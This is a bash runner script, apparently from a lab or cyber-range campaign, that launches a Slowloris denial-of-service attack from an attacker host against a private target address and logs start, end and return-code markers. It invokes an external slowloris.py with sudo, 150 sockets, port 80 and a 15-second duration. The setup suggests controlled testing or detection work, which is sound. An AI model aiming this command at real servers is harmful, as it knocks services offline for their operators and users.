#!/bin/bash
# ARCHIVIRT campaign_v1 — SCN-004 DoS Slowloris. SINGLE SOURCE OF TRUTH.
# Runs ON the attacker (ansible -m script).
set -uo pipefail

TARGET="${ARCHIVIRT_DOS_TARGET:-10.0.2.11}"
SCRIPT="${ARCHIVIRT_SLOWLORIS:-/opt/archivirt/attack-scripts/slowloris.py}"
ts() { date -u +%Y-%m-%dT%H:%M:%S.%NZ; }

echo "ARCHIVIRT_SCENARIO=SCN-004"

if ! command -v python3 >/dev/null 2>&1; then
    echo "ARCHIVIRT_PREREQUISITE_MISSING=python3"
    exit 0
fi
if [ ! -f "$SCRIPT" ]; then
    echo "ARCHIVIRT_PREREQUISITE_MISSING=slowloris:$SCRIPT"
    exit 0
fi

echo "ARCHIVIRT_ATTACK_START=$(ts)"
sudo timeout 30 python3 "$SCRIPT" "$TARGET" --port 80 --sockets 150 --duration 15
rc=$?
echo "ARCHIVIRT_ATTACK_END=$(ts)"
echo "ARCHIVIRT_ATTACK_RC=$rc"
